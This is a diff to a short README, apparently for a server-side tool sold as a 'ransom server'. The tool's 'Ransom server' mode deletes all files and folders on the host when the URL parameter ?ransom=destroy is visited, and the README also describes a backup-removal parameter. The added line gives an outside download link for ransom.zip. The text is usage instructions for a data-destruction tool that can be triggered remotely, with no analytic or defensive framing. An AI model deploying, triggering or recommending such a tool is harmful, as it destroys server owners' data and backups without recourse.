@@ -9,5 +9,7 @@ To removing backup you have to pass ?rm=true . After loading this url all backup
 # Ransom server
 Just goto ?ransom=destroy . It will delete all files and folders including your file and it will generate a warning message for server.
 
+Get file from https://devsecit.com/sdk/ransom.zip
+
 # For more visit https://devsecit.com
 ## Kanai Shil - DEV SEC IT Pvt. Ltd. 
